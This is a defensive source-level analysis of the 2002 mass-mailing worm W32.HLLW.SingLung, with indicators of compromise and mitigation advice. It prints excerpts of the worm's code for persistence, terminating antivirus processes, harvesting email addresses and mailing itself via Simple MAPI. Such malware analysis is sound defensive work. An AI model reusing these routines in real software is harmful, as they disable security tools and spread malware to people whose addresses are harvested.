# Dissecting W32.HLLW.SingLung (2002): A Defensive Source-Level Analysis 🛠️🔍

> "This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes."

## Introduction

W32.HLLW.SingLung is a Windows mass-mailing worm (January 2002) authored in C++/Win32 with inline assembly. It targets legacy Windows systems (9x/ME/NT/2000) and combines simple persistence, process tampering against security tools, address harvesting from local files, and email propagation via Simple MAPI. The sample’s logic is straightforward yet instructive: it camouflages itself with a system-like name in the system directory, hunts for “mailto:” addresses in user content, and uses the local mail configuration to redistribute the worm as an attachment. This report translates the source file `singlung.cpp` into defensive insights, with indicators of compromise and practical detection/prevention guidance.

## 1 – Overview of the Malware 🧩

- Type: Mass-mailing worm using Simple MAPI
- Targets: Windows 9x/ME/NT/2000
- Persistence: Copies itself to `%SystemDirectory%\\MsGDI32.exe` and sets autorun via `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` with value "Microsoft GDI 32 bits".
- Evasion/self‑protection: Attempts to terminate multiple security products (AVP/Kaspersky, Dr. Solomon, F‑Secure, Norton, Panda, ZoneAlarm) using Toolhelp32 + TerminateProcess.
- Address harvesting: Scans Desktop, Favorites, Personal, Windows directory, and IE cache for `mailto:` patterns in `.htm`, `.ht*`, and `.doc` files; writes findings to `singlung.txt`.
- Propagation: Sends emails via `MAPISendMail` with subject “Secret for you...” and an attachment representing the running executable, renamed as `My_Work.exe`.
- Decoy/feedback: Displays a fake error message on first run; date-based payloads show messages, draw text on screen, or drop and open `StopIntifada.htm`.

## 2 – Source Code Analysis 🔍

### 2.1 Installation and Decoy

Purpose: Determine if already installed under a target name, show a decoy error when first executed from elsewhere, and later ensure persistence in the system directory.

```cpp
// Install path check and decoy (inert excerpt; do NOT execute)
GetModuleFileName(hInst, filename, 100);
GetSystemDirectory((char*)sysdir, 100);
strcpy(sysdr, sysdir);
strcat(sysdr, "\\MSGDI32.EXE");
if ((lstrcmp(filename, sysdr)) != 0) {
    Welcome();  // fake error UI
} else {
    // connected-mode actions (harvest+send) happen here
}
```

Impact: The check uses a system-like filename. If the current image is not the target, the user sees a faux “damaged file” error (via `Welcome()`), distracting from background actions that follow.

```cpp
// Persistence (inert excerpt; do NOT execute)
strcat(sysdir, "\\MsGDI32.exe");
CopyFile(filename, sysdir, FALSE);
RegOpenKeyEx(HKEY_LOCAL_MACHINE, Run, 0, KEY_WRITE, &hReg);
RegSetValueEx(hReg, "Microsoft GDI 32 bits", 0, REG_SZ, (BYTE*)sysdir, 100);
RegCloseKey(hReg);
```

Impact: Creates `%SystemDirectory%\\MsGDI32.exe` and an autorun value that mimics a Microsoft GDI component—useful for IOC-based detection.

### 2.2 Self‑Protection: Killing Security Tools

Purpose: Enumerate processes and terminate known AV/firewall components.

```cpp
// StopAV() — process tampering (inert excerpt; do NOT execute)
lSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
uProcess.dwSize = sizeof(uProcess);
rProcessFound = Process32First(lSnapshot, &uProcess);
while (rProcessFound) {
    if (strstr(uProcess.szExeFile, antivirus) != NULL) {
        myproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, uProcess.th32ProcessID);
        if (myproc) TerminateProcess(myproc, 0);
        CloseHandle(myproc);
    }
    rProcessFound = Process32Next(lSnapshot, &uProcess);
}
CloseHandle(lSnapshot);
```

Impact: Highly detectable behavior: toolhelp snapshots plus open/terminate attempts against binary names such as `AVP32.EXE`, `NAVAPW32.EXE`, `PAVSCHED.EXE`, `ZONEALARM.EXE`.

### 2.3 Connectivity Gate and Harvesting

Purpose: Wait for network connectivity using WinINet, then traverse folders to find emails in local content.

```asm
; Connectivity wait via WinINet (inert excerpt; do NOT execute)
call    LoadLibrary          ; "WININET.DLL"
call    GetProcAddress       ; "InternetGetConnectedState"
verf:
    push    0
    push    Tmp
    call    edi               ; returns non-zero if connected
    dec     eax
    jnz     verf              ; loop until connected
```

Impact: Busy-waits on connectivity before sending mail. The call pattern (LoadLibrary/GetProcAddress for WinINet symbol) is characteristic and can be monitored.

Next, the worm harvests addresses by scanning for `mailto:` inside candidate files.

```cpp
// FindFile() — scan folders and extract mails (inert; do NOT execute)
SetCurrentDirectory(folder);
HANDLE hFile = FindFirstFile(ext, &ffile);
while (hFile != INVALID_HANDLE_VALUE && abc) {
    SetFileAttributes(ffile.cFileName, FILE_ATTRIBUTE_ARCHIVE);
    GetMail(ffile.cFileName, mail);   // extract mailto:address
    if (strlen(mail) > 0) {
        WritePrivateProfileString("EMail found", mail, "send", "singlung.txt");
        sendmail(mail);
    }
    abc = FindNextFile(hFile, &ffile);
}
```

Impact: Produces `singlung.txt` (INI‑style) as a local artefact with emails discovered. It also immediately sends messages to each discovered address.

```cpp
// GetMail() — parse "mailto:" (inert; do NOT execute)
if (!strncmpi("mailto:", mapped + i, strlen("mailto:"))) {
    i += strlen("mailto:");
    while (mapped[i] != '"' && mapped[i] != '\'' && i < size && k < 127) {
        if (mapped[i] != ' ') { mail[k++] = mapped[i]; if (mapped[i] == '@') valid = TRUE; }
        i++;
    }
    mail[k] = 0;
}
```

Impact: Extracts emails between `mailto:` and the next quote, ignoring spaces; `@` presence flags validity. The search runs over memory-mapped files for speed.

### 2.4 Email Propagation (Simple MAPI)

Purpose: Use Simple MAPI to send the worm to harvested addresses as an executable attachment.

```cpp
// sendmail() — compose and send (inert; do NOT execute)
memset(&mess, 0, sizeof(MapiMessage));
mess.lpszSubject = "Secret for you...";
mess.lpszNoteText = "Hi Friend,\n\nI send you my last work...";
// Recipient = harvested address
mess.lpRecips = (MapiRecipDesc*)malloc(sizeof(MapiRecipDesc));
mess.lpRecips->lpszName = tos;
mess.lpRecips->lpszAddress = tos;
mess.lpRecips->ulRecipClass = MAPI_TO;
mess.nRecipCount = 1;
// Attachment = current executable
mess.lpFiles = (MapiFileDesc*)malloc(sizeof(MapiFileDesc));
mess.lpFiles->lpszPathName = filename;
mess.lpFiles->lpszFileName = "My_Work.exe";
mess.nFileCount = 1;
// Fire-and-forget send
mSendMail(0, 0, &mess, 0, 0);
```

Impact: Uses process-local `filename` (path to the running worm). Lack of explicit MAPILogon relies on default session semantics; behavior may vary by client, but historically enabled autoprocessing in some setups.

### 2.5 Date-Based Messages/Artefacts

Purpose: Show political messages on specific days of the month; on day 28, write and open an HTML page.

```cpp
// FeedBack() — date triggers (inert; do NOT execute)
switch (systime.wDay) {
  case 7:  MessageBox(NULL, "...Message to USA", "Message to USA", MB_OK|MB_ICONHAND); break;
  case 11: TextOut(dc, 300, 300, "Can we try to stop the conflicts ? YES OF COURSE !", 50); break;
  case 28: /* write StopIntifada.htm and ShellExecute open */ break;
}
```

Impact: Creates visible signs on endpoints (message boxes, drawing text) and the file `StopIntifada.htm` when triggered—useful for triage.

## 3 – Mitigation and Defense Strategies 🛡️

### Detection Strategies (Analyst Focus)

- Registry:
  - `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Microsoft GDI 32 bits = %SystemDirectory%\\MsGDI32.exe`
- Files/artefacts:
  - `%SystemDirectory%\\MsGDI32.exe` (installed copy)
  - `singlung.txt` (INI-style list of harvested emails)
  - `StopIntifada.htm` (if day 28 payload triggered)
- Process behavior:
  - Toolhelp32 snapshots + `OpenProcess`/`TerminateProcess` against `AVP*.EXE`, `WFINDV32.EXE`, `F-AGNT95.EXE`, `NAVAPW32.EXE`, `NAVW32.EXE`, `NMAIN.EXE`, `PAVSCHED.EXE`, `ZONEALARM.EXE`
- API usage:
  - Dynamic loading of `WININET.DLL` → `InternetGetConnectedState`
  - Dynamic loading of `MAPI32.DLL` → `MAPISendMail`
- Email content clues:
  - Subject: "Secret for you..."; attachment name: `My_Work.exe`

### Prevention Strategies (Admin Focus)

- Application control: Only allow signed/approved executables in system directories; alert on new files named like system components (e.g., `*GDI32*.exe`).
- Tamper protection: Block untrusted processes from terminating security tools; enable EDR self-protection and alert on Toolhelp32 + TerminateProcess patterns.
- Messaging controls: Restrict Simple MAPI programmatic sends; require prompts/admin approval; monitor `MAPISendMail` invocations by unknown processes.
- Content hardening: Strip executable attachments at the secure email gateway; sandbox suspicious attachments; educate users on social-engineering lures.
- Registry monitoring: Watch `HKLM\\...\\Run` for new values pointing into `%SystemDirectory%` with unusual names.
- Legacy system hygiene: Isolate or upgrade systems where IE caches and `.doc` crawls are prevalent; implement read-only mounts for untrusted content stores.

## Conclusion

SingLung reflects early-2000s worm techniques: naive self-protection by process killing, persistence via Run keys, email harvesting from local content, and Simple MAPI-based propagation. Its reliance on dynamic API loading, busy-wait connectivity checks, and predictable artefacts gives defenders multiple hooks for detection. To mitigate similar threats, prioritize autorun protection, constrain programmatic email, and monitor for process tampering and suspicious files in system directories. Reviewing source-level logic as in `singlung.cpp` helps teams craft targeted detections and IR checklists derived from concrete IOCs.